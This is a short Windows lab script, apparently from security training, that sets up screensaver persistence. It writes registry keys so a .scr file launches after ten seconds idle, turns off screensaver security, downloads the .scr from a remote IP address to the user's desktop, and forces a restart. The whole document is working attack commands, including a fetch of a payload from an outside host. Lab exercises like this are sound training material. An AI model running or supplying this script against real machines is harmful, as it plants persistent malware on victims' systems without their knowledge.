# Author: Justin Shultz
# ID: m8rZr5w8rON0ii9RiwOdQyzmNtB3
# Lab: Persist on a Windows Machine Using a Malicious Screensaver
#
# This script sets up a screensaver persistence mechanism by:
# 1. Configuring a malicious screensaver (.scr file) to run after a short idle timeout.
# 2. Adjusting the screensaver timeout to 10 seconds and disabling screensaver security prompts.
# 3. Ensuring the screensaver is active.
# 4. Downloading the specified screensaver file from a remote URL to the user's desktop.
# 5. Restarting the computer to apply the settings.

reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "C:\Users\cents\Desktop\something_cool.scr" /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveTimeOut /t REG_SZ /d 10 /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f
Invoke-WebRequest -Uri "http://9.53.99.47/something_cool.scr" -OutFile "C:\Users\cents\Desktop\something_cool.scr"
Restart-Computer
